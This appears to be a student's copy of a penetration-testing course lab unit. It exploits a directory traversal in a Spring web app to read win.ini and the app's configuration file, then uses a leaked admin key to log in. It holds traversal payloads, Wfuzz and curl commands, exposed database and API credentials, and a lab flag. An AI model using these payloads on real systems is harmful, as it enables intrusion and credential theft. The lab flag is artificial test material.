This Learning Unit covers the following Learning Objectives:

1. Discover a directory traversal vulnerability
2. Exploit the directory traversal and obtain the application config file
3. Access the admin portion of the web application

In this Learning Unit, we will use what we discovered while enumerating the web application to find and craft an exploit for a directory traversal vulnerability. Then we'll obtain access to the admin portion of the web application.

---------

#### 16.3.1. Finding a Directory Traversal

In the previous Learning Unit, we identified the `/specials?menu=winter.html` endpoint for further testing and sent the original request to Repeater. Let's go to Repeater and click _Send_ so we have a baseline request and response.

![[Pasted image 20241108143652.png]]

Since the _menu_ parameter value references a file, let's try modifying it to a different value and checking how the application responds. We'll change `winter.html` to `web200.html`, then click _Send_.

![[Pasted image 20241108143734.png]]

The server responded with an empty HTTP 200 OK. We'll need to do some more testing here. Because it seems like the application might be retrieving a file based on the parameter value, let's try accessing a file on the server using a directory traversal attack.

We could run a tool like Wfuzz with a wordlist, but let's try some targeted attacks first. If our manual testing fails, we can always use wordlists to expand our testing in case we missed something or misinterpreted results.

First, let's consider what we learned from our Nmap scans during enumeration to help guide our manual testing.


As recapped in Listing 5, our Nmap scans found TCP port 3389 open, but identified the OS as an embedded AVtech device or Windows. Since we're assessing a web application, we are likely dealing with some version of Windows.

```bash
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|general purpose
Running (JUST GUESSING): AVtech embedded (87%), Microsoft Windows XP (85%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%), Microsoft Windows XP SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
```
If the server is a version of Windows, then `C:\windows\win.ini` may be present. Some versions of Windows don't include this file,[1](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/authentication-bypass-37069/finding-a-directory-traversal-37053#fn-local_id_289-1) but we should still check for it.

***On a Linux server, we would instead first check for /etc/passwd.***

We'll need to add several instances of "../" to our payload to traverse back to the base directory of the server. In Repeater, let's change "web200.html" to `../../../../../../../windows/win.ini` and click _Send_.

![[Pasted image 20241108155149.png]]

Excellent. The server response includes what appears to be the contents of win.ini. We have verified the existence of a directory traversal vulnerability. In the next section, we'll focus on exploiting this vulnerability.

#### 16.3.2 Exploiting a Directory Traversal

Before we continue exploiting the application, let's recap what we've discovered so far. We've identified a directory traversal vulnerability in a Java application using Spring and running on a Windows server. Perhaps we can use the directory traversal to access the application's configuration files.

According to the documentation,[1](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/authentication-bypass-37069/exploiting-a-directory-traversal-37052#fn-local_id_290-1) Spring applications load properties from application.properties files in four locations:

1. A /config subdirectory of the current directory.
2. The current directory
3. A classpath /config package
4. The classpath root
Additionally, the config file could be a .yml file instead of .properties. In Java, _classpath_[2](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/authentication-bypass-37069/exploiting-a-directory-traversal-37052#fn-local_id_290-2) refers to a location that contains dependencies outside of the standard Java files. This could be located anywhere on the server, so let's start with our focus on the first two locations.

Wfuzz can fuzz multiple payloads,[3](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/authentication-bypass-37069/exploiting-a-directory-traversal-37052#fn-local_id_290-3) which means we can make two small wordlists. One will contain path traversal strings. In the previous section, seven instances of "../" were enough to traverse back to the root of the C:\ drive. With that in mind, let's create paths.txt with a list of traversal strings, starting with one "../" and building up to a total of seven.

```bash
kali@kali:~$ nano paths.txt

kali@kali:~$ cat paths.txt
../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../
```

Next, let's build a list of file names. We are searching for `application.properties` or `application.yml`. Since the file could be in the current directory or a /config subdirectory, we'll add /config to our new file.

```bash
kali@kali:~$ nano files.txt
                                                  
kali@kali:~$ cat files.txt
application.properties
application.yml
config/application.properties
config/application.yml
```


When we run Wfuzz, it will combine the contents of the two files together, matching each payload in the first file with each payload in the second file. In other words, because paths.txt has seven payloads and files.txt has four, Wfuzz should send twenty-eight requests.

Let's try running Wfuzz with our wordlists. We need to specify them in order of use, so we'll set -w paths.txt and then -w files.txt. We'll also set --hh 0 to filter out any empty responses. Finally, we'll add our URL with FUZZFUZ2Z in the query string to mark two places to fuzz.

```bash
kali@kali:~$ wfuzz -w paths.txt -w files.txt --hh 0 http://asio/specials?menu=FUZZFUZ2Z
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://asio/specials?menu=FUZZFUZ2Z
Total requests: 28

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                   
=====================================================================

000000003:   200        18 L     21 W       523 Ch      "../ - config/application.properties"

Total time: 0
Processed Requests: 28
Filtered Requests: 27
Requests/sec.: 0
```
Wfuzz found one response with a non-zero response size. Let's use curl with the combined payload to get the full response.

```bash
kali@kali:~$ curl http://asio/specials?menu=../config/application.properties
# STRIGI'S PIZZA 
server.port=80
server.address=0.0.0.0
spring.web.resources.cache.cachecontrol.max-age=1d
# LOGGING
logging.file.name=logs/strigi.log
logging.level.root=WARN

# DATABASE
spring.datasource.driver-class-name=com.microsoft.sqlserver.jdbc.SQLServerDriver
spring.datasource.url=jdbc:sqlserver://127.0.0.1;databaseName=strigi

spring.datasource.username=sa
spring.datasource.password=MqFuFWUGNrR3P4bJ

spring.datasource.hikari.max-lifetime=30

# ADMIN PORTAL
admin.portal.key=06c82a1f-892d-48de-8682-67c0c3a096b4
```

Nice. Our directory traversal attack worked and we now have access to the application.properties file. Based on our previous Nmap scans, the application's database isn't externally accessible. Perhaps we can use the "admin.portal.key" value on the login page we found earlier.

Let's return to our browser and go to /login. We'll change the "Login Method" to "API Key", enter the value from application.properties in the `API Key` field, and click `Login`.

![[Pasted image 20241108160946.png]]
Flag:
6cedf41e3cf7a537a7cf137fd54c1104
![[Pasted image 20241108222322.png]]



Excellent. We've successfully logged in to the admin section. Now that we have access to another section of the web application, we'll need to enumerate any new pages and functionality.

The admin page will display the contents of local.txt. We can submit this value on the Labs page to gain credit for completing the authentication bypass portion of this challenge machine.

In the next Learning Unit, we will focus on discovering and exploiting a vulnerability in the authenticated section of the application to obtain remote code execution.

(Webb, Syer, et al., 2016), [https://docs.spring.io/spring-boot/docs/1.4.1.RELEASE/reference/html/boot-features-external-config.html#boot-features-external-config-application-property-files](https://docs.spring.io/spring-boot/docs/1.4.1.RELEASE/reference/html/boot-features-external-config.html#boot-features-external-config-application-property-files) [↩︎](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/authentication-bypass-37069/exploiting-a-directory-traversal-37052#fnref-local_id_290-1)
(Oracle, 2021), [https://docs.oracle.com/javase/tutorial/essential/environment/paths.html](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html) [↩︎](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/authentication-bypass-37069/exploiting-a-directory-traversal-37052#fnref-local_id_290-2)
(Xavi Mendez, 2020), [https://wfuzz.readthedocs.io/en/latest/user/getting.html#multiple-payloads](https://wfuzz.readthedocs.io/en/latest/user/getting.html#multiple-payloads) [↩︎](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/authentication-bypass-37069/exploiting-a-directory-traversal-37052#fnref-local_id_290-3)